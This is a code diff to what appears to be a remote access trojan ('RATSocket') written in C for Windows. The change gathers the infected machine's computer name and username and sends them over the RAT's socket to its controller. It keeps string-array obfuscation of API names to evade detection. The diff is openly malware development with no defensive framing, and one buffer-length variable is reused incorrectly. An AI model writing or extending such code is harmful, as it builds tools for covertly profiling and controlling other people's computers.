@@ -17,6 +17,7 @@ typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
 typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
 
 #define SOCKET_BUFFER_SIZE 256
+#define UNLEN 256
 
 struct RATSocket
 {
@@ -155,20 +156,32 @@ WinMain(HINSTANCE hInstance,
 			char ca_GetUsernameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
 			_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUsernameA);
 
-			char buffer[256];
-			DWORD len = strlen(buffer);
+			char bufferError[256];
+			char bufferUser[UNLEN + 1];
+			DWORD len = sizeof(bufferUser);
 
-			if ( f_GetUserNameA(buffer, &len) <= 0 )
+			char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
+			char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
+			len = sizeof(bufferComputer);
+			if ( GetComputerNameA(bufferComputer, &len) <= 0 )
 			{
-				char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
-				strncpy(buffer, ca_unknown, sizeof(ca_unknown));
+				sprintf(bufferError, "Could not get computer name: %ld\n", GetLastError());
+				OutputDebugStringA(bufferError);
 
-				char errorBuffer[256];
-				sprintf(errorBuffer, "Could not get username: %ld\n", GetLastError());
-				OutputDebugStringA(errorBuffer);
+				strncpy(bufferComputer, ca_unknown, sizeof(ca_unknown));
 			}
-			
-			SocketSend(&ratSocket, buffer);
+
+			if ( f_GetUserNameA(bufferUser, &len) <= 0 )
+			{
+				sprintf(bufferError, "Could not get username: %ld\n", GetLastError());
+				OutputDebugStringA(bufferError);
+
+				strncpy(bufferUser, ca_unknown, sizeof(ca_unknown));
+			}
+
+			char bufferInfo[256];
+			sprintf(bufferInfo, "%s:%s", bufferComputer, bufferUser);
+			SocketSend(&ratSocket, bufferInfo);
 		}
 		else
 		{
